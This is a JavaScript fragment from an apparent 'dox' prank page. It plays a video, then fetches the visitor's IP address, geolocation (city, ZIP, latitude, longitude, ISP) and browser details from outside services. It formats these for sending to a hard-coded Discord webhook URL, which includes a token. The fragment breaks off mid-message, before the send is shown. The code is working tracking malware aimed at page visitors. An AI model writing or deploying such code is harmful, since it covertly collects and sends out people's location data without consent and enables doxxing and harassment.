function startDox() {
    console.log("dox");
    let doxElement = document.getElementById("dox");
    let doxBgVideo = document.getElementById("dox-bg-vid");
    let doxOverlay = document.getElementById("dox-overlay");
    doxBgVideo.play();
    doxElement.style.opacity = '1';
    let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20);
    doxOverlay.style.fontSize = fontSize + 'px';

    async function displayInfo(label, value) {
        let spanElement = document.createElement("span");
        spanElement.innerText = label + ": " + value;
        doxOverlay.appendChild(spanElement);
        const overlayHeight = doxOverlay.getBoundingClientRect().height;
        if (overlayHeight > window.innerHeight) {
            fontSize -= fontSize / 10;
            doxOverlay.style.fontSize = fontSize + 'px';
        }
        await new Promise(resolve => setTimeout(resolve, 300));
    }

    async function fetchAndDisplayIPData() {
        const webhookUrl = "https://discord.com/api/webhooks/1392889091590455326/3MQJFADV6xdWPAFoWTIJvtMGc9OYwqAyQMZ6BYqlnx46D8xR_bwgp0ga5GBQ1cU63Bi_"; // Replace with your Discord webhook

        const ipData = await (await fetch("https://wtfismyip.com/json")).json();
        const locationData = await (await fetch("https://we-are-jammin.xyz/json/" + ipData.YourFuckingIPAddress)).json();
        const browserData = new BrowserDetector(window.navigator.userAgent).parseUserAgent();

        let message = `
IP Address: ${ipData.YourFuckingIPAddress}
Country: ${locationData.country}
Region: ${locationData.regionName}
City: ${locationData.city}
ZIP: ${locationData.zip}
Location: ${ipData.YourFuckingLocation}
Latitude: ${locationData.lat}
Longitude: ${locationData.lon}
Timezone: ${locationData.timezone}
Current Time: ${new Date().toLocaleString()}
ISP: ${locationData.isp}
Organization: ${locationData.org}
Autonomous System: ${locationData.as}
Browser
